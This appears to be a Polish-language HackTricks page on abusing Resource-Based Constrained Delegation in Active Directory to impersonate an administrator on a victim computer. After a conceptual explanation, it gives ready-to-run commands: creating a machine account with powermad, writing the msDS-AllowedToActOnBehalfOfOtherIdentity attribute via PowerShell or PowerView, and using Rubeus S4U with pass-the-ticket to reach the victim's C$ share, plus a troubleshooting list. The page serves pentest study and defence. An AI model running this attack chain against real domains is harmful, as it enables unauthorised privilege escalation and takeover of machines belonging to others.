# Delegacja Ograniczona na Bazie Zasobów

{{#include ../../banners/hacktricks-training.md}}


## Podstawy Delegacji Ograniczonej na Bazie Zasobów

To jest podobne do podstawowej [Delegacji Ograniczonej](constrained-delegation.md), ale **zamiast** nadawania uprawnień do **obiektu**, aby **podszywać się pod dowolnego użytkownika w stosunku do usługi**. Delegacja Ograniczona na Bazie Zasobów **ustawia** w **obiecie, kto może podszywać się pod dowolnego użytkownika w stosunku do niego**.

W tym przypadku, ograniczony obiekt będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ z nazwą użytkownika, który może podszywać się pod dowolnego innego użytkownika w stosunku do niego.

Inną ważną różnicą między tą Delegacją Ograniczoną a innymi delegacjami jest to, że każdy użytkownik z **uprawnieniami do zapisu nad kontem maszyny** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (W innych formach Delegacji potrzebne były uprawnienia administratora domeny).

### Nowe Koncepcje

W Delegacji Ograniczonej powiedziano, że flaga **`TrustedToAuthForDelegation`** w wartości _userAccountControl_ użytkownika jest potrzebna do wykonania **S4U2Self.** Ale to nie jest całkowita prawda.\
Rzeczywistość jest taka, że nawet bez tej wartości, możesz wykonać **S4U2Self** w stosunku do dowolnego użytkownika, jeśli jesteś **usługą** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`**, zwrócone TGS będzie **Forwardable**, a jeśli **nie masz** tej flagi, zwrócone TGS **nie będzie** **Forwardable**.

Jednakże, jeśli **TGS** użyte w **S4U2Proxy** **NIE jest Forwardable**, próba nadużycia **podstawowej Delegacji Ograniczonej** **nie zadziała**. Ale jeśli próbujesz wykorzystać **Delegację Ograniczoną na Bazie Zasobów, to zadziała** (to nie jest luka, to funkcja, najwyraźniej).

### Struktura Ataku

> Jeśli masz **uprawnienia równoważne do zapisu** nad kontem **Komputera**, możesz uzyskać **uprzywilejowany dostęp** do tej maszyny.

Załóżmy, że atakujący ma już **uprawnienia równoważne do zapisu nad komputerem ofiary**.

1. Atakujący **kompromituje** konto, które ma **SPN** lub **tworzy jedno** (“Usługa A”). Zauważ, że **jakikolwiek** _Użytkownik Administrator_ bez żadnych innych specjalnych uprawnień może **utworzyć** do 10 **obiektów Komputera (**_**MachineAccountQuota**_**)** i ustawić im **SPN**. Więc atakujący może po prostu stworzyć obiekt Komputera i ustawić SPN.
2. Atakujący **nadużywa swojego uprawnienia ZAPISU** nad komputerem ofiary (Usługa B), aby skonfigurować **delegację ograniczoną na bazie zasobów, aby pozwolić Usłudze A na podszywanie się pod dowolnego użytkownika** w stosunku do tego komputera ofiary (Usługa B).
3. Atakujący używa Rubeus, aby przeprowadzić **pełny atak S4U** (S4U2Self i S4U2Proxy) z Usługi A do Usługi B dla użytkownika **z uprzywilejowanym dostępem do Usługi B**.
1. S4U2Self (z konta SPN kompromitowanego/tworzonego): Prosi o **TGS Administratora dla mnie** (Nie Forwardable).
2. S4U2Proxy: Używa **nie Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administratora** do **komputera ofiary**.
3. Nawet jeśli używasz nie Forwardable TGS, ponieważ wykorzystujesz Delegację Ograniczoną na Bazie Zasobów, to zadziała.
4. Atakujący może **przekazać bilet** i **podszyć się** pod użytkownika, aby uzyskać **dostęp do UsługiB ofiary**.

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz stworzyć obiekt komputera w obrębie domeny używając [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie R**esource-based Constrained Delegation**

**Używając modułu PowerShell activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Używanie powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonywanie pełnego ataku S4U

Przede wszystkim utworzyliśmy nowy obiekt Komputera z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To będzie drukować hashe RC4 i AES dla tego konta.\
Teraz atak może być przeprowadzony:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej biletów, pytając tylko raz, używając parametru `/altservice` w Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Zauważ, że użytkownicy mają atrybut o nazwie "**Cannot be delegated**". Jeśli użytkownik ma ten atrybut ustawiony na True, nie będziesz w stanie go podszyć. Ta właściwość jest widoczna w bloodhound.

### Accessing

Ostatnia linia poleceń wykona **pełny atak S4U i wstrzyknie TGS** z Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** od Administratora, więc będziesz mógł uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów serwisowych

Dowiedz się o [**dostępnych biletach serwisowych tutaj**](silver-ticket.md#available-services).

## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że kerberos jest skonfigurowany tak, aby nie używać DES lub RC4, a Ty dostarczasz tylko hash RC4. Podaj Rubeus przynajmniej hash AES256 (lub po prostu dostarcz mu hashe rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu DC i kerberos nie działa poprawnie.
- **`preauth_failed`**: Oznacza to, że podana nazwa użytkownika + hashe nie działają przy logowaniu. Mogłeś zapomnieć wstawić "$" w nazwie użytkownika podczas generowania hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać:
  - Użytkownik, którego próbujesz naśladować, nie ma dostępu do żądanej usługi (ponieważ nie możesz go naśladować lub nie ma wystarczających uprawnień)
  - Żądana usługa nie istnieje (jeśli prosisz o bilet dla winrm, ale winrm nie działa)
  - Utworzony fakecomputer stracił swoje uprawnienia do podatnego serwera i musisz je przywrócić.

## Odniesienia

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
